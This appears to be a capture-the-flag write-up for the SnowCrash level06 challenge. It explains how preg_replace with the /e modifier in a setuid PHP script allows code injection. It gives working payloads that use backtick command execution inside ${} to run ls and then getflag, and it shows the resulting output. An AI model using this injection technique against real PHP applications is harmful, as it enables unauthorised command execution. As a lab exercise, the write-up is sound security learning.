# Level06
Ls into the working directory. 
There is one executable and one .php file.
The first executable takes one file as argument and looks like it just applies the level06.php to its argument and outputs the result.

    level06@SnowCrash:~$ cat level06.php

    #!/usr/bin/php
    <?php
    
    function y($m) { 
	    $m = preg_replace("/\./", " x ", $m); 
	    $m = preg_replace("/@/", " y", $m); return $m; 
	    }
	
    function x($y, $z) { 
	    $a = file_get_contents($y); 
	    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 
	    $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); 
	    return $a; 
	    }
	
    $r = x($argv[1], $argv[2]); print $r;
    
    ?>

This PHP script reads the contents of a file and processes it through a series of regex.

it looks for patterns like `[x ...]` and replaces them with modified versions of the inner content.
-   It replaces periods (`.`) with `x` and `@` with `y` inside these patterns.
-   It then converts all square brackets to parentheses in the file content.
-   It prints the final modified content.

For instance:

    level06@SnowCrash:~$ echo "THIS IS A TEST : [x HELLO ... @@@]" > /tmp/testa
    level06@SnowCrash:~$ ./level06 /tmp/testa
    THIS IS A TEST : HELLO  x  x  x   y y y

    

## Security problem

The use of the `/e` modifier in `preg_replace` is highly insecure as it allows execution of arbitrary PHP code, which means that whatever is parsed is transformed into php code. This can lead to security vulnerabilities such as code injection. 

Good news for us...
For example :

    level06@SnowCrash:~$ echo 'TRYING THIS STUFF [x ${`ls -al`} ]' > /tmp/test
    level06@SnowCrash:~$ ./level06 /tmp/test
    PHP Notice:  Undefined variable: total 24
    dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 .
    d--x--x--x  1 root    users    340 Aug 30  2015 ..
    -r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout
    -r-x------  1 level06 level06 3518 Aug 30  2015 .bashrc
    -rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
    -rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
    -r-x------  1 level06 level06  675 Apr  3  2012 .profile
     in /home/user/level06/level06.php(4) : regexp code on line 1
    TRYING THIS STUFF  

Now all we have to do is the same but with the getflag program, and we have our token.

    level06@SnowCrash:~$ echo 'TRYING THIS STUFF [x ${`getflag`} ]' > /tmp/test

https://www.php.net/manual/en/language.operators.execution.php